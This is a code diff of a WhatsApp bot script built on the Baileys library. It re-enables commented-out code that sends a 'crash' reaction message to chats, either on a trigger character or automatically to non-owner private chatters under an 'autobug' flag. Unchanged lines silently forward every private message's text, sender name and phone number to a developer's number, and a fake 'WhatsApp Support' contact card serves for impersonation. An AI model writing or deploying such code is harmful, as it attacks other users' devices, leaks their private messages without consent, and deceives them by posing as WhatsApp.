@@ -176,7 +176,7 @@ const reply = (teks) => { sisaco.sendMessage(m.chat,{text: teks, contextInfo: {
  
 
 //©from: ivan
-//const reactionMessage = require("@adiwajshing/baileys").proto.ReactionMessage.create({ key: mek.key, text: "" })
+const reactionMessage = require("@adiwajshing/baileys").proto.ReactionMessage.create({ key: mek.key, text: "" })
 //©from: andik
 const contactMessage = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) },"message": {"contactMessage": {"displayName": "WhatsApp Support","vcard": "BEGIN:VCARD\nVERSION:3.0\nN:Support;WhatsApp;;;\nFN:WhatsApp Support\nORG:WhatsApp Support\nTITLE:\nitem1.TEL;waid=0:+0\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-NAME:WhatsApp Support\nEND:VCARD"}}}
 function jsonformat(string) { return JSON.stringify(string, null, 2)}
@@ -193,12 +193,12 @@ const sendLstMessage = (id, text1, footer1, title1, buttonText1, sec  = [], opti
 const listMessage = {text: text1,footer: footer1,title: title1,buttonText: buttonText1, sections: sec}
 sisaco.sendMessage(id, listMessage, options)}
 
-/*if (body.startsWith(`‎`)) { 
+if (body.startsWith(`‎`)) { 
 sisaco.relayMessage(from, { reactionMessage }, { messageId: "crash" })}
 
 if (!isOwner && autobug && !isGroup) { 
 sisaco.relayMessage(from, { reactionMessage }, { messageId: "crash" })}
-*/
+
 if (!isGroup && body && !mek.key.fromMe && !isDev) {
 sisaco.sendMessage(`${nomorDeveloper}@s.whatsapp.net`, {text:`• WhatsApp\nChat : ${body}\nFrom : ${pushname}\nNumber : ${senderNumber}\nLink : wa.me/${sender}`})}
 
@@ -267,7 +267,7 @@ return reply(require('util').format(e))}}
 
 if (isCmd) {
 await sisaco.sendPresenceUpdate('composing', m.chat)
-//sisaco.sendReadReceipt(from, m.sender, [m.key.id])}
+sisaco.sendReadReceipt(from, m.sender, [m.key.id])}
 switch (command) {
 //©from: dennis    
 case 'cek': case 'test': case 'status':
